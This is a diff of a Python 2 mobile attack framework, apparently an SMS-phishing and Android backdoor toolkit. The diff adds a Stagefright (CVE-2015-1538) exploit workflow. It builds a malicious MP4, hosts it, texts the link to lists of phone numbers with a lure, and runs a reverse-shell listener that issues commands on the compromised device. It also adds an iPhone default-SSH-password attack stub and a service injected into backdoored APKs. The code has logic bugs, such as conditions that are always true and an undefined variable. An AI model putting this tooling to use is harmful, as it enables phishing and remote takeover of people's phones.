@@ -50,10 +50,10 @@ def usage():
     print "\t-f file name for exploit"
     print "\t-u url path for exploit"
     print "\t-t <custom text> for SMS"
-    print "-Remote <attack> (name of attack to throw or list to all attacks)"
-    print "\t-n/-N <number/file of numbers> to attack"
-    print "\t-p port for listener/shellcode"
-    print "\t-t <custom text> for SMS"
+    #print "-Remote <attack> (name of attack to throw or list to all attacks)"
+    #print "\t-n/-N <number/file of numbers> to attack"
+    #print "\t-p port for listener/shellcode"
+    #print "\t-t <custom text> for SMS"
     print 
 def main(argv):
     if len(sys.argv) < 2:
@@ -220,10 +220,17 @@ def autopwnphish(url,text,number,numberfile,page,campaignlabel):
 def list_client_sides():
     print "\t1.) CVE-2010-1759"
     print "\t2.) CVE-2013-4710"
+    print "\t3.) CVE-2015-1538 (Stagefright)"
 def list_remote():
     print "\t1.) CVE-2015-1538 (StageFright)"
+    print "\t2.) iPhone SSH Default Password (Alpine)"
 def remote_attack(whichremote,number,numberfile,port,text):
-	print "Something"
+	 ipaddress = config.get("IPADDRESS")
+         shellipaddress = config.get("SHELLIPADDRESS")
+         if port == None:
+                 port = config.get("SHELLPORT")
+         if whichremote.lower() == "alpine" or 2:
+		print "alpine"
 def client_side_attack(whichclientside,number,numberfile,url,file,port,text,send):
          webserver = config.get("WEBSERVER")
          ipaddress = config.get("IPADDRESS")
@@ -238,7 +245,59 @@ def client_side_attack(whichclientside,number,numberfile,url,file,port,text,send
           	url = "/" + url
 	 if file[0] != '/':
 		file = "/" + file
-	 if whichclientside == "CVE-2010-1759" or 1:
+         if whichclientside == "CVE-2015-1538" or 3 or "Stagefright":
+		dagahdir = config.get("DAGAHLOC")
+	        command1 = "python " + dagahdir + "/exploits/Android/mp4.py -c " + ipaddress + " -p " + port + " -o " + dagahdir + "/exploits/Android" + file 
+		os.system(command1)
+		sploitfile = webserver + url + file
+                command8 = "cp " + dagahdir + "/exploits/Android" + file + " " + sploitfile
+                os.system(command8)
+                command9 = "chmod 777 " + sploitfile
+                os.system(command9)
+		if send == "yes":
+                   if text == None:
+                        text = "This is a cool page: "
+                   if number != None:
+                        fulltext = text + " " + link
+                        sendsms(number,fulltext)
+                   elif numberfile != None:
+                      with open(numberfile) as f:
+                        lines = f.readlines()
+                        for line in lines:
+                          line = line.strip()
+                          fulltext = text +" " +link
+                          sendsms(line,fulltext)
+		vulnerable = "no"
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(180)
+                s.bind((str(shellipaddress), int(port)))
+                s.listen(1)
+                data_socket = None
+                try:
+                    data_socket, addr = s.accept()
+                except socket.timeout:
+                    pass
+                if data_socket:
+                    vulnerable = "yes"
+                    print "Connected: Try exit to quit"
+                    data="/system/bin/id\n"
+                    data_socket.sendall(data)
+                    data = data_socket.recv(1024)
+		    print data
+              	    while True:
+                        data = raw_input().strip()
+
+                        if data == "exit":
+                             data_socket.close()
+                             break
+                        data = data + "\n"
+                        data_socket.sendall(data)
+                        data = data_socket.recv(1024)
+                        print data
+                print "\nVulnerable: " + vulnerable
+    
+
+	 elif whichclientside == "CVE-2010-1759" or 1:
 	    link = "http://" + ipaddress + url + file
             fullpath = webserver  + url
             command1 = "mkdir " + fullpath
@@ -364,6 +423,18 @@ def agentcommand(number,command,agentparameters,deliverymethod):
                 textmessage = param[1]
         if deliverymethod.lower() == "http":
             sendcommandhttp(number,command + " none http " + target + " " + textmessage)
+    elif command == "SHOW":
+	textmessage = "blank"
+        if agentparameters != None:
+        	params = agentparameters.split(",")
+        	for x in range(0,len(params)):
+            		param = params[x].split(":")
+            		if param[0] == "message":
+                		textmessage = param[1]
+        	if deliverymethod.lower() == "http":
+           	 sendcommandhttp(number,command + " none http " + textmessage)
+	else :
+		sendcommandhttp(number,command + " none http")
     elif command == "EXEC":
         params = agentparameters.split(",")
         for x in range(0,len(params)):
@@ -537,7 +608,7 @@ def sendcommandhttp(number,command):
     f = open(control, 'w')
     f.write(command)
     f.close()
-
+    print command
 
 			
 
@@ -560,7 +631,7 @@ def list_agent_commands():
     print "\t15.) Remove Locks (Android < 4.4) (LOCK)"
     print "\t16.) Upload APK (UAPK)"
     print "\t17.) Get Wifi IP Address (GTIP)"
-
+    print "\t18.) Message User (SHOW)"
 
 def list_live_agents():
     print "Live Agents:"
@@ -797,7 +868,7 @@ def autoagentphish(url,text,number,numberfile,page,appstore,backdoorapp,key,sign
                     sendsms(line,fulltext)
     copy1 = "cp " + androidagent + "*" + " " + localpath + "/"
     os.system(copy1)
-    startcommand = "python agentattachpoller.py > log"
+    startcommand = "python agentattachpoller.pyc > log"
     pid = os.fork()
     if pid == 0:
         os.system(startcommand)
@@ -890,6 +961,9 @@ def androidbackdoor(inputfile,number,key,url,signing,jarsignalias,keypass,delive
           os.system("cp -rf AndroidAgent2/smali/jackpal " + foldername + "/smali/")
           manifestfile = foldername + "/AndroidManifest.xml"
           inject = """
+          <service
+          android:name="com.bulbsecurity.framework.ToastService">
+          </service>
           <receiver android:name="com.bulbsecurity.framework.SMSReceiver">
           <intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED" /></intent-filter>
           </receiver>
@@ -1314,21 +1388,21 @@ def stop_poller(poller):
         p = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
         out, err = p.communicate()
         for line in out.splitlines():
-            if 'apipoller.py' in line:
+            if 'apipoller.pyc' in line:
                 pid = int(line.split()[1])
                 os.kill(pid, signal.SIGKILL)
     if poller == "modem" or "all":	
         p = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
         out, err = p.communicate()
         for line in out.splitlines():
-            if 'modempoller.py' in line:
+            if 'modempoller.pyc' in line:
                 pid = int(line.split()[1])
                 os.kill(pid, signal.SIGKILL)
         if poller == "agent" or "all":
             p = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
             out, err = p.communicate()
             for line in out.splitlines():
-                if 'agentpoll.py' in line or 'agentattachpoller.py' in line:
+                if 'agentpoll.pyc' in line or 'agentattachpoller.pyc' in line:
                     pid = int(line.split()[1])
                     os.kill(pid, signal.SIGKILL)
             if check_mysql() == 0:
@@ -1347,7 +1421,7 @@ def make_api(path,key):
     make_apifiles(path)
     if check_apache()== 0:
     	os.system("service apache2 start>/dev/null")
-    startcommand = "python apipoller.py " + path + " " + key + " > log"
+    startcommand = "python apipoller.pyc " + path + " " + key + " > log"
     pid = os.fork()
     if pid == 0:
         os.system(startcommand)
@@ -1396,11 +1470,11 @@ def check_apache():
 		return 0
 
 def check_mysql():
-	process = os.popen("netstat -antp | grep mysql").read().splitlines()
-	if len(process) == 1:
-		return 1
-	else:
-		return 0
+	#process = os.popen("netstat -antp | grep mysql").read().splitlines()
+	#if len(process) == 1:
+	return 1
+	#else:
+	#	return 0
 
 def make_modem(number,url,key):
     if url[0] != '/':
@@ -1411,7 +1485,7 @@ def make_modem(number,url,key):
     handshake(url,key)
     modemtype = "app"
     database_add2(number,url,key,modemtype)
-    startcommand = "python modempoller.py " + url + " " + key + " > log"
+    startcommand = "python modempoller.pyc " + url + " " + key + " > log"
     pid = os.fork()
     if pid == 0:
         os.system(startcommand)
